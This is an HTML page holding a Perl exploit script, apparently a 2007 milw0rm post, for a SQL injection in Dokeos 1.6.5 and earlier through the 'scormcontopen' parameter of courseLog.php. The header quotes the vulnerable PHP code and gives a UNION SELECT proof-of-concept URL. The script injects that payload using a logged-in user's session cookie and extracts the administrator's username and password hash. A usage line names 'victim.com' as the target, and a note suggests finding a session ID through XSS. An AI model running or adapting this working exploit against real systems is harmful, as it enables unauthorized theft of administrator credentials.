<html><head><title>Dokeos <= 1.6.5 (courseLog.php scormcontopen) SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

#################################################################################
#										#
#	      	      Dokeos &lt;= 1.6.5 SQL Injection Exploit			#
#										#
# Discovered by: Silentz							#
# Payload: Admin Username &amp; Hash Retrieval					#
# Website: http://www.w4ck1ng.com						#
# 										#
# Vulnerable Code (courseLog.php): 						#
#										#
#	if ($_GET['scormcontopen'])						#
#	{									#
#	include_once(api_get_library_path().'/database.lib.php');		#
#	include('../scorm/XMLencode.php');					#
#	$TBL_SCORM_MAIN     = Database::get_scorm_main_table();			#
#	$result = api_sql_query(&quot;SELECT contentTitle FROM $TBL_SCORM_MAIN 	#
#	where (contentId=&quot;.$_GET['scormcontopen'].&quot;)&quot;);				#
#	$ar = mysql_fetch_array($result);					#
#	$contentTitle = $ar['contentTitle'];					#
#	$path=api_get_path('SYS_COURSE_PATH');					#
#	$file=$path.$_cid.'/scorm'.$contentTitle.'/imsmanifest.xml';		#
#	$charset = GetXMLEncode($file);						#
#	header('Content-Type: text/html; charset='. $charset);			#
#	}									#
#										#
# PoC: /claroline/tracking/courseLog.php?scormcontopen=-999) UNION SELECT 	#
#      CONCAT(char(58),char(58),username,char(58),char(58),password,char(58),	#
#      char(58)) FROM user WHERE user_id=1 /*					#
#										#
# 										#
# Subject To: Having an already existant student/teacher account		#
#										#
# GoogleDork: Get your own!							#
# Shoutz: The entire w4ck1ng community						#
#										#
# Notes: You need to obtain your current SESSION_ID; use your browser to 	#
#	 disclose or find an XSS.						#
#										#
#################################################################################

use LWP::UserAgent;
if (@ARGV &lt; 2){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;           	   Dokeos &lt;= 1.6.5 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;Usage: w4ck1ng_dokeos.pl [PATH] [SESSION_ID]\r\n\r\n&quot;;
print &quot;[PATH] = Path where Dokeos is located\r\n&quot;;
print &quot;[SESSION_ID] = Session identifier of logged on user\r\n\r\n&quot;;
print &quot;e.g. w4ck1ng_dokeos.pl http://victim.com/dokeos/ cjjjauie95inbmo5fim8m93vo1\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
exit();
}

$b = LWP::UserAgent-&gt;new() or die &quot;Could not initialize browser\n&quot;;
$b-&gt;agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$cookie = &quot;$ARGV[1];&quot;;
$host = $ARGV[0] . &quot;claroline/tracking/courseLog.php?scormcontopen=-999) UNION SELECT CONCAT(char(58),char(58),username,char(58),char(58),password,char(58),char(58)) FROM user WHERE user_id=1 /*&quot;;

my @cookie = ('Cookie' =&gt; &quot;dk_sid=$cookie;&quot;);
my $res = $b-&gt;get($host, @cookie);

$answer = $res-&gt;content;
if ($answer =~ /scorm::(.*?)::/){
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;           	   Dokeos &lt;= 1.6.5 SQL Injection Exploit\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;[+] Admin User : $1\n&quot;;
}

if ($answer =~/::([0-9a-fA-F]{32})::\/imsmanifest.xml/){
print &quot;[+] Admin Hash : $1\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
print &quot;            		 http://www.w4ck1ng.com\r\n&quot;;
print &quot;            		        ...Silentz\r\n&quot;;
print &quot;-------------------------------------------------------------------------\r\n&quot;;
}

else {
  print &quot;\nExploit Failed...\n&quot;;
}

# milw0rm.com [2007-05-24]</pre></html>